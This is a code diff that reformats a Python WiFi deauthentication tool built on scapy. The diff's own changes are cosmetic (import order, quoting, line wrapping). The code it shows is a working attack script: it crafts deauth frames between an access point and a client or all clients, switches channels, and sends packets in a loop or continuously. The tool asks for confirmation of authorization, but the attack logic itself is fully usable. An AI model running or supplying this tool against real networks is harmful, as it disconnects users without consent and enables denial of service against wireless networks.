@@ -5,29 +5,32 @@ Sends deauthentication frames to disconnect clients from WiFi networks
 Used for authorized security testing and network analysis
 """
 
-import sys
-import os
 import argparse
-import time
 import subprocess
+import sys
+import time
 from typing import Optional
 
 from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
 from scapy.sendrecv import sendp
 
 from utils import (
-    validate_mac,
-    validate_interface,
     check_monitor_mode,
     require_root,
     setup_logging,
+    validate_interface,
+    validate_mac,
 )
 
 
 class DeauthAttacker:
-    def __init__(self, interface: str, target_bssid: str,
-                 target_client: Optional[str] = None,
-                 channel: Optional[int] = None) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        target_client: Optional[str] = None,
+        channel: Optional[int] = None,
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid
         self.target_client: str = target_client or "ff:ff:ff:ff:ff:ff"
@@ -48,10 +51,10 @@ class DeauthAttacker:
                 raise ValueError(f"Invalid channel: {self.channel}")
 
             result = subprocess.run(
-                ['iwconfig', self.interface, 'channel', str(self.channel)],
+                ["iwconfig", self.interface, "channel", str(self.channel)],
                 capture_output=True,
                 text=True,
-                timeout=5
+                timeout=5,
             )
 
             if result.returncode == 0:
@@ -68,22 +71,30 @@ class DeauthAttacker:
     def create_deauth_packet(self) -> list[object]:
         """Create deauthentication packets."""
         # Packet from AP to client
-        packet1 = RadioTap() / Dot11(
-            type=0,
-            subtype=12,
-            addr1=self.target_client,
-            addr2=self.target_bssid,
-            addr3=self.target_bssid
-        ) / Dot11Deauth(reason=7)
+        packet1 = (
+            RadioTap()
+            / Dot11(
+                type=0,
+                subtype=12,
+                addr1=self.target_client,
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
+            )
+            / Dot11Deauth(reason=7)
+        )
 
         # Packet from client to AP
-        packet2 = RadioTap() / Dot11(
-            type=0,
-            subtype=12,
-            addr1=self.target_bssid,
-            addr2=self.target_client,
-            addr3=self.target_bssid
-        ) / Dot11Deauth(reason=7)
+        packet2 = (
+            RadioTap()
+            / Dot11(
+                type=0,
+                subtype=12,
+                addr1=self.target_bssid,
+                addr2=self.target_client,
+                addr3=self.target_bssid,
+            )
+            / Dot11Deauth(reason=7)
+        )
 
         return [packet1, packet2]
 
@@ -119,8 +130,9 @@ class DeauthAttacker:
                     sendp(packet, iface=self.interface, verbose=False)
                     self.packets_sent += 1
 
-                self.logger.info("[%d/%d] Sent deauth packets (Total: %d)",
-                                 i + 1, count, self.packets_sent)
+                self.logger.info(
+                    "[%d/%d] Sent deauth packets (Total: %d)", i + 1, count, self.packets_sent
+                )
                 time.sleep(delay)
 
             self.logger.info("Attack completed. Sent %d packets", self.packets_sent)
@@ -201,23 +213,32 @@ Note:
   - Target BSSID is the MAC address of the access point
   - Target client is optional (defaults to broadcast - all clients)
   - This tool is for authorized security testing only!
-        """
+        """,
     )
 
-    parser.add_argument('-i', '--interface', required=True,
-                        help='Wireless interface in monitor mode')
-    parser.add_argument('-b', '--bssid', required=True,
-                        help='Target BSSID (MAC address of access point)')
-    parser.add_argument('-c', '--client',
-                        help='Target client MAC address (default: broadcast to all)')
-    parser.add_argument('-n', '--count', type=int, default=10,
-                        help='Number of deauth packets to send (default: 10)')
-    parser.add_argument('-d', '--delay', type=float, default=0.1,
-                        help='Delay between packets in seconds (default: 0.1)')
-    parser.add_argument('-ch', '--channel', type=int,
-                        help='WiFi channel to use (optional)')
-    parser.add_argument('--continuous', action='store_true',
-                        help='Send deauth packets continuously until stopped')
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
+    )
+    parser.add_argument(
+        "-b", "--bssid", required=True, help="Target BSSID (MAC address of access point)"
+    )
+    parser.add_argument(
+        "-c", "--client", help="Target client MAC address (default: broadcast to all)"
+    )
+    parser.add_argument(
+        "-n", "--count", type=int, default=10, help="Number of deauth packets to send (default: 10)"
+    )
+    parser.add_argument(
+        "-d",
+        "--delay",
+        type=float,
+        default=0.1,
+        help="Delay between packets in seconds (default: 0.1)",
+    )
+    parser.add_argument("-ch", "--channel", type=int, help="WiFi channel to use (optional)")
+    parser.add_argument(
+        "--continuous", action="store_true", help="Send deauth packets continuously until stopped"
+    )
 
     args = parser.parse_args()
 
@@ -231,7 +252,7 @@ Note:
         logger.warning("%s may not be in monitor mode", args.interface)
         logger.warning("Enable monitor mode with: sudo airmon-ng start <interface>")
         response = input("Continue anyway? (y/N): ")
-        if response.lower() != 'y':
+        if response.lower() != "y":
             sys.exit(1)
 
     # Authorization warning
@@ -251,7 +272,7 @@ Note:
     print("=" * 70)
 
     response = input("\nDo you have authorization to perform this attack? (yes/no): ")
-    if response.lower() != 'yes':
+    if response.lower() != "yes":
         logger.info("Attack cancelled - Authorization required")
         sys.exit(1)
 
@@ -260,7 +281,7 @@ Note:
         interface=args.interface,
         target_bssid=args.bssid,
         target_client=args.client,
-        channel=args.channel
+        channel=args.channel,
     )
 
     # Perform attack
